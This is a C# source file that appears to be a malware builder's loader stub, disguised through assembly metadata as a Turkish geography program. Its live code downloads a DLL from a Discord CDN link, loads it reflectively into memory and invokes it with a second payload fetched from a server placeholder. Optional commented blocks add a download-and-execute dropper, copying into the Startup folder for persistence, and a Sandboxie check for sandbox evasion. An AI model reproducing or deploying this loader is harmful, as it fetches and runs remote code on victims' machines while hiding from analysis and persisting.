using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;



//Default [assembly: AssemblyTitle("Coğrafyalar Programı")]
//Default [assembly: AssemblyDescription("Cografyalar")]
//Default [assembly: AssemblyCompany("www.cografyalar.com")]
//Default [assembly: AssemblyProduct("Cografyalar Player")]
//Default [assembly: AssemblyCopyright("Copyright © cografyalar Sitesi")]
//Default [assembly: AssemblyFileVersion("2003.0.0.0")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
namespace sharp
{
    static class Program
    {

        [STAThread]
        static void Main()
        {
            using (WebClient webclient = new WebClient())
            {

                try
                {
                 //sandboxie controlsandboxie();

                    //Messega



                    //download try
                    //download {
                    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
                    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
                    //download }
                    //download catch
                    //download {
                    //download }




                 
                
            

                   byte[] webData = webclient.DownloadData("https://cdn.discordapp.com/attachments/841595401253158954/842759705482231828/run.dll");


                    object iletisim = new object[] { %aPP%, string.Empty, webclient.DownloadData("%Server%"), true };


                    AppDomain.CurrentDomain.Load(webData).GetType("IsolatedStorage.packet_server").InvokeMember("CodeAccessSecurityAttribute", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])iletisim);


                        //start  {
                    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
                    //start  }




                }
                catch { return; }




                   


            }

        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }
    }
}
